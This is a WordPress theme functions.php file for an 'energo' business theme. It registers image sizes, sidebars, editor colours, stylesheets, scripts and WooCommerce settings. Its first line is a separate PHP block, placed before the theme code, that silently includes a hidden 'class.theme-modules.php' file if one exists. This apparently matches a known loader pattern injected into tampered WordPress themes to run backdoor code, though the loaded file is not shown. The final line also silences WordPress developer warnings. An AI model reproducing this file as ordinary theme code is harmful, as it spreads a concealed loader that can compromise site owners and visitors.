<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php require_once get_template_directory() . '/includes/loader.php';

add_action( 'after_setup_theme', 'energo_setup_theme' );
add_action( 'after_setup_theme', 'energo_load_default_hooks' );


function energo_setup_theme() {

	load_theme_textdomain( 'energo', get_template_directory() . '/languages' );

	// Add default posts and comments RSS feed links to head.

	/*
	 * Let WordPress manage the document title.
	 * By adding theme support, we declare that this theme does not use a
	 * hard-coded <title> tag in the document head, and expect WordPress to
	 * provide it for us.
	 */
	add_theme_support( 'title-tag' );
	add_theme_support( 'custom-header' );
	add_theme_support( 'custom-background' );
	add_theme_support('woocommerce');
	add_theme_support('wc-product-gallery-lightbox');

	/*
	 * Enable support for Post Thumbnails on posts and pages.
	 *
	 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
	 */
	add_theme_support( 'post-thumbnails' );
	add_theme_support( 'automatic-feed-links' );
	add_theme_support( 'wp-block-styles' );
	add_theme_support( 'align-wide' );
	add_theme_support( 'wp-block-styles' );
	add_theme_support( 'editor-styles' );
	
	//Set the default content width.
	$GLOBALS['content_width'] = 525;
	
	/*---------- Register image sizes ----------*/
	
	//Register image sizes
    add_image_size( 'energo_270x160', 270, 160, true ); //Featured Services V1
    add_image_size( 'energo_370x450', 370, 450, true ); //Services V1
    add_image_size( 'energo_370x770', 370, 770, true ); //Latest Projects V1 & Masonry
    add_image_size( 'energo_770x370', 770, 370, true ); //Latest Projects V1
    add_image_size( 'energo_370x370', 370, 370, true ); //Latest Projects V1 & V3 & 3 Column & 4 Column & Masonry
    add_image_size( 'energo_370x450', 370, 450, true ); //Team V1
    add_image_size( 'energo_80x80', 80, 80, true ); //Testimonials V1 & V2
    add_image_size( 'energo_310x270', 310, 270, true ); //News V1
    add_image_size( 'energo_540x300', 540, 300, true ); //Featured Services V2
    add_image_size( 'energo_370x245', 370, 245, true ); //Services V2 & V3
    add_image_size( 'energo_600x380', 600, 380, true ); //Latest Projects V2
    add_image_size( 'energo_510x270', 510, 270, true ); //News V2 & Blog 2 Column
    add_image_size( 'energo_300x155', 300, 155, true ); //Featured Services V3
    add_image_size( 'energo_210x200', 210, 200, true ); //Team V2
    add_image_size( 'energo_300x265', 300, 265, true ); //Testimonials V3
    add_image_size( 'energo_570x380', 570, 380, true ); //Projects 2 Column
    add_image_size( 'energo_310x295', 310, 295, true ); //Blog List
    add_image_size( 'energo_710x360', 710, 360, true ); //Blog Single & Blog
    add_image_size( 'energo_85x85', 85, 85, true ); //Work Gallery Footer
    add_image_size( 'energo_70x70', 70, 70, true ); //Popular Post Sidebar
	
	/*---------- Register image sizes ends ----------*/

	// This theme uses wp_nav_menu() in two locations.
	register_nav_menus( array(
		'main_menu' => esc_html__( 'Main Menu', 'energo' ),
		'footer_menu' => esc_html__( 'Footer Menu', 'energo' ),
		'onepage_menu' => esc_html__( 'OnePage Menu', 'energo' ),
	) );

	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'comment-form',
		'comment-list',
		'gallery',
		'caption',
	) );

	// Add theme support for Custom Logo.
	add_theme_support( 'custom-logo', array(
		'width'      => 250,
		'height'     => 250,
		'flex-width' => true,
	) );

	// Add theme support for selective refresh for widgets.
	add_theme_support( 'customize-selective-refresh-widgets' );

	/*
	 * This theme styles the visual editor to resemble the theme style,
	 * specifically font, colors, and column width.
 	 */
	add_editor_style();
	add_action( 'admin_init', 'energo_admin_init', 2000000 );
}

/**
 * [energo_admin_init]
 *
 * @param  array $data [description]
 *
 * @return [type]       [description]
 */


function energo_admin_init() {
	remove_action( 'admin_notices', array( 'ReduxFramework', '_admin_notices' ), 99 );
}

/*---------- Sidebar settings ----------*/

/**
 * [energo_widgets_init]
 *
 * @param  array $data [description]
 *
 * @return [type]       [description]
 */
function energo_widgets_init() {

	global $wp_registered_sidebars;

	$theme_options = get_theme_mod( 'energo' . '_options-mods' );

	register_sidebar( array(
		'name'          => esc_html__( 'Default Sidebar', 'energo' ),
		'id'            => 'default-sidebar',
		'description'   => esc_html__( 'Widgets in this area will be shown on the right-hand side.', 'energo' ),
		'before_widget' => '<div id="%1$s" class="widget sidebar-widget single-sidebar %2$s">',
		'after_widget'  => '</div>',
		'before_title' => '<div class="sidebar-title"><h5>',
		'after_title' => '</h5></div>'
	) );
	register_sidebar(array(
		'name' => esc_html__( 'Blog Listing', 'energo' ),
		'id' => 'blog-sidebar',
		'description' => esc_html__( 'Widgets in this area will be shown on the right-hand side.', 'energo' ),
		'before_widget'=>'<div id="%1$s" class="widget blog-sidebar sidebar-widget %2$s">',
		'after_widget'=>'</div>',
		'before_title' => '<div class="widget-title"><h5>',
		'after_title' => '</h5></div>'
	));
	register_sidebar(array(
		'name' => esc_html__('Footer Widget', 'energo'),
		'id' => 'footer-sidebar',
		'description' => esc_html__('Widgets in this area will be shown in Footer Area.', 'energo'),
		'before_widget'=>'<div class="col-lg-3 col-md-6 col-sm-12 footer-column"><div id="%1$s" class="footer-widget %2$s">',
		'after_widget'=>'</div></div>',
		'before_title' => '<div class="widget-title"><h5>',
		'after_title' => '</h5></div>'
	));
	if ( class_exists( '\Elementor\Plugin' )){
		register_sidebar(array(
			'name' => esc_html__('Services Widget', 'energo'),
			'id' => 'service-sidebar',
			'description' => esc_html__('Widgets in this area will be shown in Services Sidebar.', 'energo'),
			'before_widget' => '<div id="%1$s" class="sidebar-widget %2$s">',
			'after_widget' => '</div>',
			'before_title' => '<div class="widget-title"><h5>',
			'after_title' => '</h5></div>'
		));
		register_sidebar(array(
			'name' => esc_html__('Footer Widget Two', 'energo'),
			'id' => 'footer-sidebar-2',
			'description' => esc_html__('Widgets in this area will be shown in Footer Area.', 'energo'),
			'before_widget' => '<div class="col-lg-4 col-md-6 col-sm-12 footer-column"><div id="%1$s" class="footer-widget %2$s">',
			'after_widget' => '</div></div>',
			'before_title' => '<div class="widget-title"><h5>',
			'after_title' => '</h5></div>'
		));
		register_sidebar(array(
			'name' => esc_html__('Footer Widget Three', 'energo'),
			'id' => 'footer-sidebar-3',
			'description' => esc_html__('Widgets in this area will be shown in Footer Area.', 'energo'),
			'before_widget'=>'<div class="col-lg-3 col-md-6 col-sm-12 footer-column"><div id="%1$s" class="footer-widget %2$s">',
			'after_widget'=>'</div></div>',
			'before_title' => '<div class="widget-title"><h5>',
			'after_title' => '</h5></div>'
		));
	}
	
	if ( ! is_object( energo_WSH() ) ) {
		return;
	}

	$sidebars = energo_set( $theme_options, 'custom_sidebar_name' );

	foreach ( array_filter( (array) $sidebars ) as $sidebar ) {

		if ( energo_set( $sidebar, 'topcopy' ) ) {
			continue;
		}

		$name = $sidebar;
		if ( ! $name ) {
			continue;
		}
		$slug = str_replace( ' ', '_', $name );

		register_sidebar( array(
			'name'          => $name,
			'id'            => sanitize_title( $slug ),
			'before_widget' => '<div id="%1$s" class="%2$s widget ">',
			'after_widget'  => '</div>',
			'before_title'  => '<div class="widget-title"><h4>',
			'after_title'   => '</h4></div>',
		) );
	}

	update_option( 'wp_registered_sidebars', $wp_registered_sidebars );
}

add_action( 'widgets_init', 'energo_widgets_init' );

/*---------- Sidebar settings ends ----------*/

/*---------- Gutenberg settings ----------*/

function energo_gutenberg_editor_palette_styles() {
    add_theme_support( 'editor-color-palette', array(
        array(
            'name' => esc_html__( 'strong yellow', 'energo' ),
            'slug' => 'strong-yellow',
            'color' => '#f7bd00',
        ),
        array(
            'name' => esc_html__( 'strong white', 'energo' ),
            'slug' => 'strong-white',
            'color' => '#fff',
        ),
		array(
            'name' => esc_html__( 'light black', 'energo' ),
            'slug' => 'light-black',
            'color' => '#242424',
        ),
        array(
            'name' => esc_html__( 'very light gray', 'energo' ),
            'slug' => 'very-light-gray',
            'color' => '#797979',
        ),
        array(
            'name' => esc_html__( 'very dark black', 'energo' ),
            'slug' => 'very-dark-black',
            'color' => '#000000',
        ),
    ) );
	
	add_theme_support( 'editor-font-sizes', array(
		array(
			'name' => esc_html__( 'Small', 'energo' ),
			'size' => 10,
			'slug' => 'small'
		),
		array(
			'name' => esc_html__( 'Normal', 'energo' ),
			'size' => 15,
			'slug' => 'normal'
		),
		array(
			'name' => esc_html__( 'Large', 'energo' ),
			'size' => 24,
			'slug' => 'large'
		),
		array(
			'name' => esc_html__( 'Huge', 'energo' ),
			'size' => 36,
			'slug' => 'huge'
		)
	) );
	
}
add_action( 'after_setup_theme', 'energo_gutenberg_editor_palette_styles' );

/*---------- Gutenberg settings ends ----------*/

/*---------- Enqueue Styles and Scripts ----------*/

function energo_enqueue_scripts() {
	//styles
	wp_enqueue_style( 'fontawesome-all', get_template_directory_uri() . '/assets/css/fontawesome-all.css' );
	wp_enqueue_style( 'flaticon', get_template_directory_uri() . '/assets/css/flaticon.css' );
	wp_enqueue_style( 'owl', get_template_directory_uri() . '/assets/css/owl.css' );
    wp_enqueue_style( 'bootstrap', get_template_directory_uri() . '/assets/css/bootstrap.css' );
	wp_enqueue_style( 'fancybox', get_template_directory_uri() . '/assets/css/jquery.fancybox.min.css' );
	wp_enqueue_style( 'flashy', get_template_directory_uri() . '/assets/css/flashy.min.css' );
    wp_enqueue_style( 'animate', get_template_directory_uri() . '/assets/css/animate.css' );
    wp_enqueue_style( 'jquery-ui', get_template_directory_uri() . '/assets/css/jquery-ui.css' );
    wp_enqueue_style( 'nice-select', get_template_directory_uri() . '/assets/css/nice-select.css' );
	wp_enqueue_style( 'energo-theme-color', get_template_directory_uri() . '/assets/css/theme-color.css' );
	wp_enqueue_style( 'energo-main', get_stylesheet_uri() );
	wp_enqueue_style( 'energo-woocommerce', get_template_directory_uri() . '/assets/css/woocommerce.css' );
	wp_enqueue_style( 'energo-style', get_template_directory_uri() . '/assets/css/style.css' );
	wp_enqueue_style( 'energo-rtl', get_template_directory_uri() . '/assets/css/rtl.css' );
	wp_enqueue_style( 'energo-custom', get_template_directory_uri() . '/assets/css/custom.css' );
	wp_enqueue_style( 'energo-responsive', get_template_directory_uri() . '/assets/css/responsive.css' );
	
    //scripts
	wp_enqueue_script( 'jquery-ui-core');
	wp_enqueue_script( 'popper', get_template_directory_uri().'/assets/js/popper.min.js', array( 'jquery' ), '2.1.2', true );
    wp_enqueue_script( 'bootstrap', get_template_directory_uri().'/assets/js/bootstrap.min.js', array( 'jquery' ), '2.1.2', true );
	wp_enqueue_script( 'owl', get_template_directory_uri().'/assets/js/owl.js', array( 'jquery' ), '2.1.2', true );
	wp_enqueue_script( 'wow', get_template_directory_uri().'/assets/js/wow.js', array( 'jquery' ), '2.1.2', true );
    wp_enqueue_script( 'fancybox', get_template_directory_uri().'/assets/js/jquery.fancybox.js', array( 'jquery' ), '2.1.2', true );
    wp_enqueue_script( 'flashy', get_template_directory_uri().'/assets/js/flashy.js', array( 'jquery' ), '2.1.2', true );
	wp_enqueue_script( 'appear', get_template_directory_uri().'/assets/js/appear.js', array( 'jquery' ), '2.1.2', true );
	wp_enqueue_script( 'scrollbar', get_template_directory_uri().'/assets/js/scrollbar.js', array( 'jquery' ), '2.1.2', true );
	wp_enqueue_script( 'jquery-ui', get_template_directory_uri().'/assets/js/jquery-ui.js', array( 'jquery' ), '2.1.2', true );
	wp_enqueue_script( 'nice-select', get_template_directory_uri().'/assets/js/jquery.nice-select.min.js', array( 'jquery' ), '2.1.2', true );
	wp_enqueue_script( 'isotope', get_template_directory_uri().'/assets/js/isotope.js', array( 'jquery' ), '2.1.2', true );
	wp_enqueue_script( 'lettering', get_template_directory_uri().'/assets/js/jquery.lettering.min.js', array( 'jquery' ), '2.1.2', true );
	wp_enqueue_script( 'circleType', get_template_directory_uri().'/assets/js/jquery.circleType.js', array( 'jquery' ), '2.1.2', true );
	wp_enqueue_script( 'countdown', get_template_directory_uri().'/assets/js/countdown.js', array( 'jquery' ), '2.1.2', true );
    wp_enqueue_script( 'energo-main-script', get_template_directory_uri().'/assets/js/script.js', array(), false, true );
	if( is_singular() ) wp_enqueue_script('comment-reply');
}
add_action( 'wp_enqueue_scripts', 'energo_enqueue_scripts' );

/*---------- Enqueue styles and scripts ends ----------*/

/*---------- Google fonts ----------*/

function energo_fonts_url() {
	$fonts_url = '';

	$font_families['Roboto'] = 'Lexend:wght@300,400,500,600,700,800';
	$font_families['Open+Sans'] = 'Lato:ital,wght@0,300,0,400,0,700,0,900,1,300,1,400,1,700,1,900';

	$font_families = apply_filters( 'ENERGO/includes/classes/header_enqueue/font_families', $font_families );

	$query_args = array(
		'family' => urlencode( implode( '|', $font_families ) ),
		'subset' => urlencode( 'latin,latin-ext' ),
	);

	$protocol  = is_ssl() ? 'https' : 'http';
	$fonts_url = add_query_arg( $query_args, $protocol . '://fonts.googleapis.com/css' );

	return esc_url_raw($fonts_url);
}

function energo_theme_styles() {
    wp_enqueue_style( 'energo-theme-fonts', energo_fonts_url(), array(), null );
}

add_action( 'wp_enqueue_scripts', 'energo_theme_styles' );
add_action( 'admin_enqueue_scripts', 'energo_theme_styles' );

/*---------- Google fonts ends ----------*/

/*---------- More functions ----------*/

// 1) energo_set function

/**
 * [energo_set description]
 *
 * @param  array $data [description]
 *
 * @return [type]       [description]
 */
if ( ! function_exists( 'energo_set' ) ) {
	function energo_set( $var, $key, $def = '' ) {
		//if( ! $var ) return false;

		if ( is_object( $var ) && isset( $var->$key ) ) {
			return $var->$key;
		} elseif ( is_array( $var ) && isset( $var[ $key ] ) ) {
			return $var[ $key ];
		} elseif ( $def ) {
			return $def;
		} else {
			return false;
		}
	}
}

// 2) energo_add_editor_styles function

function energo_add_editor_styles() {
    add_editor_style( 'editor-style.css' );
}
add_action( 'admin_init', 'energo_add_editor_styles' );

// 3) Add specific CSS class by filter body class.

$options = energo_WSH()->option(); 
if( energo_set($options, 'boxed_wrapper') ){

add_filter( 'body_class', function( $classes ) {
    $classes[] = 'boxed_wrapper';
    return $classes;
} );
}
/*---------- More functions ends ----------*/

// 4) energo_related_products_limit function 

function energo_related_products_limit() {
  global $product;
	
	$args['posts_per_page'] = 6;
	return $args;
}

add_filter( 'woocommerce_output_related_products_args', 'energo_related_products_args', 20 );
function energo_related_products_args( $args ) {
	$args['posts_per_page'] = 3; // 4 related products
	$args['columns'] = 1; // arranged in 2 columns
	return $args;
}

//Shop Product per page
function energo_shop_per_page( $cols ) {
  $cols = 12;
  return $cols;
}
add_filter( 'loop_shop_per_page', 'energo_shop_per_page', 20 );
/*---------- More functions ends ----------*/


/*---------- More functions ends ----------*/

add_filter('doing_it_wrong_trigger_error', function () {return false;}, 10, 0);